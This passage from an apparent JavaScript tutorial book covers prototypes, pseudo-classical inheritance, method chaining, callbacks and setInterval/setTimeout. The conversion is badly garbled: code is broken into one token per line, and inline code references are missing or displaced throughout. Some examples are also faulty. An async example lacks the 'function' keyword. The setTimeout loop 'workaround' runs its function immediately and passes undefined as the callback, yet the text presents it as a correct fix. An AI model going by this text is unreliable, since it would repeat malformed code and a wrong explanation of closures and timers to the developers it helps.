**prototype**, which is the same as saying that **prototype** is the
prototype of obj

**var**

obj

=

Object

.

create

(

**prototype**

)

;

Now all the properties and methods from **prototype** will be
available to obj

console.

log

(

obj.

foo

)

;

console.

log

(

obj.

bar

(

)

)

;

Console output

&quot;foo&quot;

&quot;foo&quot;

Prototypal inheritance is made through object references internally
and objects are completely mutable. This means any change you make on
a prototype will immediately affect every other object that prototype
is prototype of.

**prototype**

.

foo

=

&quot;bar&quot;

;

console.

log

(

obj.

foo

)

;

Console output

&quot;bar&quot;

  
  Object                     .    **prototype**
    

  

is the prototype of every object, so it&apos;s strongly recommended you
don&apos;t mess with it, especially

if you use any third party library, but we can play with it a little
bit.

Object

.

**prototype**

.

breakingLibraries

=

&apos;foo&apos;

;

console.

log

(

obj.

breakingLibraries

)

;

console.

log

(

**prototype**

.

breakingLibraries

)

;

Console output

&quot;foo&quot;

&quot;foo&quot;

**Fun fact** I&apos;ve used the browser console to make these examples and
broken this page by adding that breakingLibraries property.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch27-4">Section 27.4: Pseudo-classical inheritance</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
It&apos;s an emulation of classical inheritance using prototypical
inheritance which shows how powerful prototypes are. It was made to
make the language more attractive to programmers coming from other
languages.

Version &lt; 6

**IMPORTANT NOTE**: Since ES6 it doesn&apos;t make sense to use
pseudo-classical inheritance since the language simulates conventional
classes. If you&apos;re not using ES6, [you
should](http://www.2ality.com/2015/08/getting-started-es6.html). If
you still want to use the classical inheritance pattern and you&apos;re in
a ECMAScript 5 or lower environment, then pseudo-classical is your
best bet.
>
A &quot;class&quot; is just a function that is made to be called with the
**new** operand and it&apos;s used as a constructor.

**function**

Foo

(

id

,

name

)

{

**this**

.

id

=

id

;

**this**

.

name

=

name

;

}

**var**

foo

=

**new**

Foo

(

1

,

&apos;foo&apos;

)

;

console.

log

(

foo.

id

)

;

Console output

1

foo is an instance of Foo. The JavaScript coding convention says if a
function begins with a capital letter case it can be called as a
constructor (with the **new** operand).
>
To add properties or methods to the &quot;class&quot; you have to add them to
its prototype, which can be found in the **prototype** property of the
constructor.

Foo.

**prototype**

.

bar

=

&apos;bar&apos;

;

console.

log

(

foo.

bar

)

;

Console output

bar

  
  Foo.**prototype**
  

  

In fact what Foo is doing as a &quot;constructor&quot; is just creating
objects with as it&apos;s prototype.
>
You can find a reference to its constructor on every object

console.

log

(

foo.

constructor

)

;

function Foo(id, name) { &hellip;

console.

log

(

{

}

.

constructor

)

;

function Object() { &lbrack;native code&rbrack; }

And also check if an object is an instance of a given class with the
**instanceof** operator

console.

log

(

foo

**instanceof**

Foo

)

;

true

console.

log

(

foo

**instanceof**

Object

)

;

true

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch27-5">Section 27.5: Setting an Object&apos;s prototype</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Version ≥ 5

  
  Object                           .     create
  - - -

  

With ES5+, the function can be used to create an Object with any other
Object as it&apos;s prototype.

**const**

anyObj

=

{

hello

(

)

{

console.

log

(

&grave;

**this**

.

foo

is &dollar;

{

**this**

.

foo

}

&grave;

)

;

}

,

}

;

**let**

objWithProto

=

Object

.

create

(

anyObj

)

;

objWithProto.

foo

=

&apos;bar&apos;

;

objWithProto.

hello

(

)

;

*// &quot;this.foo is bar&quot;*

  
  Object                     .    **prototype**
    

  

To explicitly create an Object without a prototype, use **null** as
the prototype. This means the Object will not inherit from either and
is useful for Objects used for existence checking dictionaries, e.g.

**let**

objInheritingObject

=

{

}

;

**let**

objInheritingNull

=

Object

.

create

(

**null**

)

;

&apos;toString&apos;

**in**

objInheritingObject

;

*// true*

&apos;toString&apos;

**in**

objInheritingNull

;

*// false*

Version

≥

6

  -
  Object               .   setPrototypeOf
    

  -

From ES6, the prototype of an existing Object can be changed using ,
for example

**let**

obj

=

Object

.

create

(

{

foo

:

&apos;foo&apos;

}

)

;

obj

=

Object

.

setPrototypeOf

(

obj

,

{

bar

:

&apos;bar&apos;

}

)

;

obj.

foo

;

*// undefined*

obj.

bar

;

*// &quot;bar&quot;*

This can be done almost anywhere, including on a **this** object or in
a constructor.
>
**Note:** This process is very slow in current browsers and should be
used sparingly, try to create the Object with the desired prototype
instead.

Version &lt; 5

Before ES5, the only way to create an Object with a manually defined
prototype was to construct it with **new**, for example

**var**

proto

=

{

fizz

:

&apos;buzz&apos;

}

;

**function**

ConstructMyObj

(

)

{

}

ConstructMyObj.

**prototype**

=

proto

;

**var**

objWithProto

=

**new**

ConstructMyObj

(

)

;

objWithProto.

fizz

;

*// &quot;buzz&quot;*

  
  Object                           .     create
  - - -

  

This behaviour is close enough to that it is possible to write a
polyfill.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch28">Chapter 28: Method Chaining</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch28-1">Section 28.1: Chainable object design and chaining</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Chaining and Chainable is a design methodology used to design object
behaviors so that calls to object functions return references to self,
or another object, providing access to additional function calls
allowing the calling statement to chain together many calls without
the need to reference the variable holding the object/s.

  
  **return** **this**
  

  

Objects that can be chained are said to be chainable. If you call an
object chainable, you should ensure that all returned objects /
primitives are of the correct type. It only takes one time for your
chainable object to not return the correct reference (easy to forget
to add ) and the person using your API will lose trust and avoid
chaining. Chainable objects should be all or nothing (not a chainable
object even if parts are). An object should not be called chainable if
only some of its functions are.

**Object designed to be chainable**

**function**

Vec

(

x

=

0

,

y

=

0

)

{

**this**

.

x

=

x

;

**this**

.

y

=

y

;

*// the new keyword implicitly implies the return type*

*// as this and thus is chainable by default.*

}

Vec.

**prototype**

=

{

add

:

**function**

(

vec

)

{

**this**

.

x

+=

vec.

x

;

**this**

.

y

+=

vec.

y

;

**return**

**this**

;

*// return reference to self to allow chaining of function calls*

}

,

scale

:

**function**

(

val

)

{

**this**

.

x

&ast;=

val

;

**this**

.

y

&ast;=

val

;

**return**

**this**

;

*// return reference to self to allow chaining of function calls*

}

,

log

:

**function**

(

val

)

{

console.

log

(

**this**

.

x

&plus;

&apos; : &apos;

&plus;

**this**

.

y

)

;

**return**

**this**

;

}

,

clone

:

**function**

(

)

{

**return**

**new**

Vec

(

**this**

.

x

,

**this**

.

y

)

;

}

}

**Chaining example**

**var**

vec

=

**new**

Vec

(

)

;

vec.

add

(

{

x

:

10

,

y

:

10

}

)

.

add

(

{

x

:

10

,

y

:

10

}

)

.

log

(

)

*// console output &quot;20 : 20&quot;*

.

add

(

{

x

:

10

,

y

:

10

}

)

.

scale

(

1

/

30

)

.

log

(

)

*// console output &quot;1 : 1&quot;*

.

clone

(

)

*// returns a new instance of the object*

.

scale

(

2

)

*// from which you can continue chaining*

.

log

(

)

**Don&apos;t create ambiguity in the return type**

  
  clone
  

  

  
  toString
  

  

Not all function calls return a useful chainable type, nor do they
always return a reference to self. This is where common sense use of
naming is important. In the above example the function call .() is
unambiguous. Other examples are .() implies a string is returned.
>
An example of an ambiguous function name in a chainable object.

*// line object represents a line*

line.

rotate

(

1

)

.

vec

(

)

;

*// ambiguous you don&apos;t need to be looking up docs while writing.*

line.

rotate

(

1

)

.

asVec

(

)

*// unambiguous implies the return type is the line as a vec (vector)*

.

add

(

{

x

:

10

,

y

:

10

)

*// toVec is just as good as long as the programmer can use the naming*

*// to infer the return type*

**Syntax convention**
>
There is no formal usage syntax when chaining. The convention is to
either chain the calls on a single line if short or to chain on the
new line indented one tab from the referenced object with the dot on
the new line. Use of the semicolon is optional but does help by
clearly denoting the end of the chain.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<p align="left">
  <img src="./images/image029.png"
  title=" "
  alt="."
  style="border: 2px solid #000000; width:7.486in;" />

**A bad syntax**
>
vec *// new line before the first function call*
>
.scale() *// can make it unclear what the intention is*
>
.log();
>
vec. *// the dot on the end of the line* scale(2). *// is very
difficult to see in a mass of code* scale(1/2); *// and will likely
frustrate as can easily be missed* *// when trying to locate bugs*
>
**Left hand side of assignment**
>
When you assign the results of a chain the last returning call or
object reference is assigned.
>
**var** vec2 = vec.scale(2) .add(x:1,y:10)
>
.clone(); *// the last returned result is assigned*
>
*// vec2 is a clone of vec after the scale and add*
>
In the above example vec2 is assigned the value returned from the last
call in the chain. In this case, that would be a copy of vec after the
scale and add.
>
**Summary**
>
The advantage of changing is clearer more maintainable code. Some
people prefer it and will make chainable a requirement when selecting
an API. There is also a performance benefit as it allows you to avoid
having to create variables to hold interim results. With the last word
being that chainable objects can be used in a conventional way as well
so you don&apos;t enforce chaining by making an object chainable.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch28-2">Section 28.2: Method Chaining</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Method chaining is a programming strategy that simplifies your code
and beautifies it. Method chaining is done by ensuring that each
method on an object returns the entire object, instead of returning a
single element of that object. For example:

**function**

Door

(

)

{

**this**

.

height

=

&apos;&apos;

;

**this**

.

width

=

&apos;&apos;

;

**this**

.

status

=

&apos;closed&apos;

;

}

Door.

**prototype**

.

open

=

**function**

(

)

{

**this**

.

status

=

&apos;opened&apos;

;

**return**

**this**

;

}

Door.

**prototype**

.

close

=

**function**

(

)

{

**this**

.

status

=

&apos;closed&apos;

;

**return**

**this**

;

}

Door.

**prototype**

.

setParams

=

**function**

(

width

,

height

)

{

**this**

.

width

=

width

;

**this**

.

height

=

height

;

**return**

**this**

;

}

Door.

**prototype**

.

doorStatus

=

**function**

(

)

{

console.

log

(

&apos;The&apos;

,

**this**

.

width

,

&apos;x&apos;

,

**this**

.

height

,

&apos;Door is&apos;

,

**this**

.

status

)

;

**return**

**this**

;

}

**var**

smallDoor

=

**new**

Door

(

)

;

smallDoor.

setParams

(

20

,

100

)

.

open

(

)

.

doorStatus

(

)

.

close

(

)

.

doorStatus

(

)

;

  
  Door.**prototype**
  

  

Note that each method in returns **this**, which refers to the entire
instance of that Door object.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch29">Chapter 29: Callbacks</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-1">Section 29.1: Simple Callback Usage Examples</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Callbacks offer a way to extend the functionality of a function (or
method) ***without changing*** its code. This approach is often used
in modules (libraries / plugins), the code of which is not supposed to
be changed.
>
Suppose we have written the following function, calculating the sum of
a given array of values:

**function**

foo

(

array

)

{

**var**

sum

=

0

;

**for**

(

**var**

i

=

0

;

i

&lt;

array.

length

;

i

++

)

{

sum

+=

array

&lbrack;

i

&rbrack;

;

}

**return**

sum

;

}

  
  alert
  

  

Now suppose that we want to do something with each value of the array,
e.g. display it using (). We could make the appropriate changes in the
code of foo, like this:

**function**

foo

(

array

)

{

**var**

sum

=

0

;

**for**

(

**var**

i

=

0

;

i

&lt;

array.

length

;

i

++

)

{

alert

(

array

&lbrack;

i

&rbrack;

)

;

sum

+=

array

&lbrack;

i

&rbrack;

;

}

**return**

sum

;

}

  
  console.log                    instead of                 alert
  -  -

  

But what if we decide to use ()? Obviously changing the code of foo,
whenever we
>
decide to do something else with each value, is not a good idea. It is
much better to have the option to change our mind without changing the
code of foo. That&apos;s exactly the use case for callbacks. We only have
to slightly change foo&apos;s signature and body:

**function**

foo

(

array

,

callback

)

{

**var**

sum

=

0

;

**for**

(

**var**

i

=

0

;

i

&lt;

array.

length

;

i

++

)

{

callback

(

array

&lbrack;

i

&rbrack;

)

;

sum

+=

array

&lbrack;

i

&rbrack;

;

}

**return**

sum

;

}

And now we are able to change the behaviour of foo just by changing
its parameters:

**var**

array

=

&lbrack;

&rbrack;

;

foo

(

array

,

alert

)

;

foo

(

array

,

**function**

(

x

)

{

console.

log

(

x

)

;

}

)

;

**Examples with Asynchronous Functions**

  
  &dollar;.getJSON
  

  

In jQuery, the () method to fetch JSON data is asynchronous.
Therefore, passing code in a callback makes sure that the code is
called *after* the JSON is fetched.

  
  &dollar;.getJSON
  

  

() syntax:

&dollar;.

getJSON

(

url

,

dataObject

,

successCallback

)

;

  
  &dollar;.getJSON
  

  

Example of () code:

&dollar;.

getJSON

(

&quot;foo.json&quot;

,

{

}

,

**function**

(

data

)

{

*// data handling code*

}

)

;

  
  &dollar;.getJSON
  

  

The following would *not* work, because the data-handling code would
likely be called *before* the data is actually received, because the
function takes an unspecified length of time and does not hold up the
call stack as it waits for the JSON.

&dollar;.

getJSON

(

&quot;foo.json&quot;

,

{

}

)

;

*// data handling code*

  
  animate
  

  

Another example of an asynchronous function is jQuery&apos;s () function.
Because it takes a specified time to run the animation, sometimes it
is desirable to run some code directly following the animation.

  
  animate
  

  

.() syntax:

jQueryElement.

animate

(

properties

,

duration

,

callback

)

;

For example, to create a fading-out animation after which the element
completely disappears, the following code can be run. Note the use of
the callback.

elem.

animate

(

{

opacity

:

0

}

,

5000

,

**function**

(

)

{

elem.

hide

(

)

;

}

)

;

This allows the element to be hidden right after the function has
finished execution. This differs from:

elem.

animate

(

{

opacity

:

0

}

,

5000

)

;

elem.

hide

(

)

;

  
  animate
  

  

because the latter does not wait for () (an asynchronous function) to
complete, and therefore the element is hidden right away, producing an
undesirable effect.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-2">Section 29.2: Continuation (synchronous and asynchronous)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Callbacks can be used to provide code to be executed after a method
has completed:

*/&ast;&ast;*

*&ast; &bsol;@arg {Function} then continuation callback*

*&ast;/*

**function**

doSomething

(

then

)

{

console.

log

(

&apos;Doing something&apos;

)

;

then

(

)

;

}

*// Do something, then execute callback to log &apos;done&apos;*

doSomething

(

**function**

(

)

{

console.

log

(

&apos;Done&apos;

)

;

}

)

;

console.

log

(

&apos;Doing something else&apos;

)

;

*// Outputs:*

*// &quot;Doing something&quot;*

*// &quot;Done&quot;*

*// &quot;Doing something else&quot;*

  
  doSomething   () method above executes synchronously with the        doSomething
                callback - execution blocks until                      
  -  -

  

The () returns, ensuring that the callback is executed before the
interpreter moves on.
>
Callbacks can also be used to execute code asynchronously:

doSomethingAsync

(

then

)

{

setTimeout

(

then

,

1000

)

;

console.

log

(

&apos;Doing something asynchronously&apos;

)

;

}

doSomethingAsync

(

**function**

(

)

{

console.

log

(

&apos;Done&apos;

)

;

}

)

;

console.

log

(

&apos;Doing something else&apos;

)

;

*// Outputs:*

*// &quot;Doing something asynchronously&quot;*

*// &quot;Doing something else&quot;*

*// &quot;Done&quot;*

  
  doSomething
  

  

The then callbacks are considered continuations of the () methods.
Providing a callback as the last instruction in a function is called a
[tail-call](https://en.wikipedia.org/wiki/Tail_call), which is
[optimized by ES2015
interpreters](http://www.2ality.com/2015/06/tail-call-optimization.html).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-3">Section 29.3: What is a callback?</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

This is a normal function call:

console.

log

(

&quot;Hello World!&quot;

)

;

When you call a normal function, it does its job and then returns
control back to the caller.
>
However, sometimes a function needs to return control back to the
caller in order to do its job:

&lbrack;

1

,

2

,

3

&rbrack;

.

map

(

**function**

double

(

x

)

{

**return**

2

&ast;

x

;

}

)

;

In the above example, the function double is a callback for the
function map because:

1.  The function double is given to the function map by the caller.

2.  The function map needs to call the function double zero or more
    times in order to do its job.

Thus, the function map is essentially returning control back to the
caller every time it calls the function double. Hence, the name
"callback".
>
Functions may accept more than one callback:

promise.

then

(

**function**

onFulfilled

(

value

)

{

console.

log

(

&quot;Fulfilled with value &quot;

&plus;

value

)

;

}

,

**function**

onRejected

(

reason

)

{

console.

log

(

&quot;Rejected with reason &quot;

&plus;

reason

)

;

}

)

;

Here then function then accepts two callback functions, onFulfilled
and onRejected. Furthermore, only one of these two callback functions
is actually called.
>
What&apos;s more interesting is that the function then returns before
either of the callbacks are called. Hence, a callback function may be
called even after the original function has returned.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-4">Section 29.4: Callbacks and &grave;this&grave;</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Often when using a callback you want access to a specific context.

**function**

SomeClass

(

msg

,

elem

)

{

**this**

.

msg

=

msg

;

elem.

addEventListener

(

&apos;click&apos;

,

**function**

(

)

{

console.

log

(

**this**

.

msg

)

;

*// &lt;= will fail because &quot;this&quot; is undefined*

}

)

;

}

**var**

s

=

**new**

SomeClass

(

&quot;hello&quot;

,

someElement

)

;

**Solutions** Use bind
>
bind effectively generates a new function that sets **this** to
whatever was passed to bind then calls the original function.

**function**

SomeClass

(

msg

,

elem

)

{

**this**

.

msg

=

msg

;

elem.

addEventListener

(

&apos;click&apos;

,

**function**

(

)

{

console.

log

(

**this**

.

msg

)

;

}

.

bind

(

**this**

)

)

;

*// &lt;=- bind the function to &grave;this&grave;*

}

Use arrow functions

Arrow functions automatically bind the current **this** context.

**function**

SomeClass

(

msg

,

elem

)

{

**this**

.

msg

=

msg

;

elem.

addEventListener

(

&apos;click&apos;

,

(

)

=&gt;

{

*// &lt;=- arrow function binds &grave;this&grave;*

console.

log

(

**this**

.

msg

)

;

}

)

;

}

Often you&apos;d like to call a member function, ideally passing any
arguments that were passed to the event on to the function.
>
**Solutions:**

Use bind

**function**

SomeClass

(

msg

,

elem

)

{
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<p align="left">
  <img src="./images/image031.png"
  title=" "
  alt="."
  style="border: 2px solid #000000; width:7.197in;" />

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-5">Section 29.5: Callback using Arrow function</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Using arrow function as callback function can reduce lines of
code.**
>
The default syntax for arrow function is

(

)

=&gt;

{

}

This can be used as callbacks
>
For example if we want to print all elements in an array &lbrack;1,2,3,4,5&rbrack;
without arrow function, the code will look like this

&lbrack;

1

,

2

,

3

,

4

,

5

&rbrack;

.

forEach

(

**function**

(

x

)

{

console.

log

(

x

)

;

}

With arrow function, it can be reduced to

&lbrack;

1

,

2

,

3

,

4

,

5

&rbrack;

.

forEach

(

x

=&gt;

console.

log

(

x

)

)

;

  
  **function**   (x){   console.log    (x)} is reduced to x   =&gt;console.log
     - 

  

Here the callback function (x)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch29-6">Section 29.6: Error handling and control-flow branching</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Callbacks are often used to provide error handling. This is a form of
control flow branching, where some instructions are executed only when
an error occurs:

**const**

expected

=

**true**

;

**function**

compare

(

actual

,

success

,

failure

)

{

**if**

(

actual

===

expected

)

{

success

(

)

;

}

**else**

{

failure

(

)

;

}

}

**function**

onSuccess

(

)

{

console.

log

(

&apos;Value was expected&apos;

)

;

}

**function**

onFailure

(

)

{

console.

log

(

&apos;Value was unexpected/exceptional&apos;

)

;

}

compare

(

**true**

,

onSuccess

,

onFailure

)

;

compare

(

**false**

,

onSuccess

,

onFailure

)

;

*// Outputs:*

*// &quot;Value was expected&quot;*

*// &quot;Value was unexpected/exceptional&quot;*

  
  compare
  

  

Code execution in () above has two possible branches: success when the
expected and actual values are the same, and error when they are
different. This is especially useful when control flow should branch
after some asynchronous instruction:

**function**

compareAsync

(

actual

,

success

,

failure

)

{

setTimeout

(

**function**

(

)

{

compare

(

actual

,

success

,

failure

)

}

,

1000

)

;

}

compareAsync

(

**true**

,

onSuccess

,

onFailure

)

;

compareAsync

(

**false**

,

onSuccess

,

onFailure

)

;

console.

log

(

&apos;Doing something else&apos;

)

;

*// Outputs:*

*// &quot;Doing something else&quot;*

*// &quot;Value was expected&quot;*

*// &quot;Value was unexpected/exceptional&quot;*

  
  compare
  

  

It should be noted, multiple callbacks do not have to be mutually
exclusive  both methods could be called. Similarly, the () could be
written with callbacks that are optional (by using a
[noop](https://en.wikipedia.org/wiki/NOP) as the default value - see
[Null Object
pattern](https://en.wikipedia.org/wiki/Null_Object_pattern)).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch30">Chapter 30: Intervals and Timeouts</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-1">Section 30.1: Recursive setTimeout</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

To repeat a function indefinitely, setTimeout can be called
recursively:

**function**

repeatingFunc

(

)

{

console.

log

(

&quot;It&apos;s been 5 seconds. Execute the function again.&quot;

)

;

setTimeout

(

repeatingFunc

,

5000

)

;

}

setTimeout

(

repeatingFunc

,

5000

)

;

Unlike setInterval, this ensures that the function will execute even
if the function&apos;s running time is longer than the specified delay.
However, it does not guarantee a regular interval between function
executions. This behaviour also varies because an exception before the
recursive call to setTimeout will prevent it from repeating again,
while setInterval would repeat indefinitely regardless of exceptions.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-2">Section 30.2: Intervals</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**function**

waitFunc

(

)

{

console.

log

(

&quot;This will be logged every 5 seconds&quot;

)

;

}

window.

setInterval

(

waitFunc

,

5000

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-3">Section 30.3: Intervals</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Standard**
>
You don&apos;t need to create the variable, but it&apos;s a good practice as
you can use that variable with clearInterval to stop the currently
running interval.
>
**var** int = setInterval(&quot;doSomething()&quot;, 5000 ); */&ast; 5 seconds
&ast;/*
>
**var** int = setInterval(doSomething, 5000 ); */&ast; same thing, no
quotes, no parens &ast;/*
>
If you need to pass parameters to the doSomething function, you can
pass them as additional parameters beyond the first two to
setInterval.
>
**Without overlapping**
>
setInterval, as above, will run every 5 seconds (or whatever you set
it to) no matter what. Even if the function doSomething takes long
than 5 seconds to run. That can create issues. If you just want to
make sure there is that pause in between runnings of doSomething, you
can do this:

(

**function**

(

)

{

doSomething

(

)

;

setTimeout

(

arguments.

callee

,

5000

)

;

}

)

(

)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-4">Section 30.4: Removing intervals</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  window.setInterval


() returns an IntervalID, which can be used to stop that interval from
continuing to run. To

  window.setInterval       () in a variable and call    clearInterval


do this, store the return value of () with that variable as the only
argument:

**function**

waitFunc

(

)

{

console.

log

(

&quot;This will be logged every 5 seconds&quot;

)

;

}

**var**

interval

=

window.

setInterval

(

waitFunc

,

5000

)

;

window.

setTimeout

(

**function**

(

)

{

clearInterval

(

interval

)

;

}

,

32000

)

;

  This will be logged every                            5   seconds


This will log every 5 seconds, but will stop it after 32 seconds. So
it will log the message 6 times.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-5">Section 30.5: Removing timeouts</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  window.setTimout


() returns a TimeoutID, which can be used to stop that timeout from
running. To do this, store

  window.setTimeout        () in a variable and call     clearTimeout


the return value of () with that variable as the only argument:

**function**

waitFunc

(

)

{

console.

log

(

&quot;This will not be logged after 5 seconds&quot;

)

;

}

**function**

stopFunc

(

)

{

clearTimeout

(

timeout

)

;

}

**var**

timeout

=

window.

setTimeout

(

waitFunc

,

5000

)

;

window.

setTimeout

(

stopFunc

,

3000

)

;

This will not log the message because the timer is stopped after 3
seconds.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch30-6">Section 30.6: setTimeout, order of operations, clearTimeout</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**setTimeout**
>
Executes a function, after waiting a specified number of milliseconds.
>
used to delay the execution of a function.

  setTimeout   (   **function**   ,   milliseconds   ) or window.setTimeout   (   **function**   ,   milliseconds

**Syntax :** )
>
**Example :** This example outputs &quot;hello&quot; to the console after 1
second. The second parameter is in milliseconds, so 1000 = 1 sec, 250
= 0.25 sec, etc.

setTimeout

(

**function**

(

)

{

console.

log

(

&apos;hello&apos;

)

;

}

,

1000

)

;

**Problems with setTimeout** if you&apos;re using the setTimeout method in
a for loop **:**

**for**

(

i

=

0

;

i

&lt;

3

;

++

i

)

{

setTimeout

(

**function**

(

)

{

console.

log

(

i

)

;

}

,

500

)

;

}

  
  three
  

  

This will output the value 3 times, which is not correct.
>
Workaround of this problem :

**for**

(

i

=

0

;

i

&lt;

3

;

++

i

)

{

setTimeout

(

**function**

(

j

)

{

console.

log

(

i

)

;

}

(

i

)

,

1000

)

;

}

It will output the value 0,1,2. Here, we're passing the i into the
function as a parameter(j).
>
**Order of operations**
>
